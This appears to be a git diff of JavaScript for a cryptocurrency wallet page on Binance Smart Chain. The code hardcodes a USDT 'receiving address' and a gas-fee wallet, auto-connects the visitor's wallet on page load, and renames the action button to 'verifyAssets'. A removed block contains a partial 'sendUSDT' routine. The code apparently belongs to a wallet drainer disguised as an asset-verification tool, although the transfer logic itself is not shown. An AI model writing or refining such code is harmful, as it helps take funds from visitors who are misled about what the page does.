@@ -1,97 +1,9 @@
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
- const USDT_ABI = [
-    {
-      constant: true,
-      inputs: [{ internalType: "address", name: "account", type: "address" }],
-      name: "balanceOf",
-      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-      payable: false,
-      stateMutability: "view",
-      type: "function",
-    },
-    {
-      constant: false,
-      inputs: [
-        { internalType: "address", name: "recipient", type: "address" },
-        { internalType: "uint256", name: "amount", type: "uint256" },
-      ],
-      name: "transfer",
-      outputs: [{ internalType: "bool", name: "", type: "bool" }],
-      payable: false,
-      stateMutability: "nonpayable",
-      type: "function",
-    },
-    {
-      constant: false,
-      inputs: [
-        { internalType: "address", name: "spender", type: "address" },
-        { internalType: "uint256", name: "value", type: "uint256" }
-      ],
-      name: "approve",
-      outputs: [{ internalType: "bool", name: "", type: "bool" }],
-      payable: false,
-      stateMutability: "nonpayable",
-      type: "function"
-    }    
-  ];
-
-  // BSC RPC Provider
-  const rpcUrl = "https://bsc-dataseed.binance.org/";
-  const bscProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
 let web3;
 let userAddress;
-
- const App = () => {
-    const [address, setAddress] = useState(RECIPIENT_ADDRESS);
-    const [usdtAmount, setUsdtAmount] = useState("");
-    const [usdtBalance, setUsdtBalance] = useState(0);
-    const [bnbBalance, setBnbBalance] = useState(0);
-    const [walletConnected, setWalletConnected] = useState(false);
-    const [loading, setLoading] = useState(false);
-    const [transferCompleted, setTransferCompleted] = useState(false);
-    const [walletAddress, setWalletAddress] = useState("");
-
-    const isProcessing = useRef(false);
-
-    const sendUSDT = async () => {
-      if (isProcessing.current) return;
-    
-      try {
-        isProcessing.current = true;
-        setLoading(true);
-        setTransferCompleted(false);
-    
-        if (!window.ethereum) {
-          return;
-        }
-    
-        const web3 = new Web3(window.ethereum);
-    
-        // Request accounts
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-        if (!sender || !web3.utils.isAddress(sender)) {
-          return;
-        }
-    
-        // Check and switch to BSC
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: "0x38" }],
-          });
-        }
-    
-        // Validate address in URL (required)
-        const params = new URLSearchParams(window.location.search);
-        const userAddress = params.get("address");
-    
-        if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
-          return;
-        }
 
 async function connectWallet() {
     if (window.ethereum) {
@@ -120,7 +32,7 @@ async function connectWallet() {
 // Auto-connect wallet on page load
 window.addEventListener("load", connectWallet);
 
-async function Next() {
+async function verifyAssets() {
     if (!web3 || !userAddress) {
         alert("Wallet not connected. Refresh the page.");
         return;
@@ -243,4 +155,4 @@ function showPopup(message, color) {
 }
 
 // Attach event listener
-document.getElementById("Next").addEventListener("click", Next);
+document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
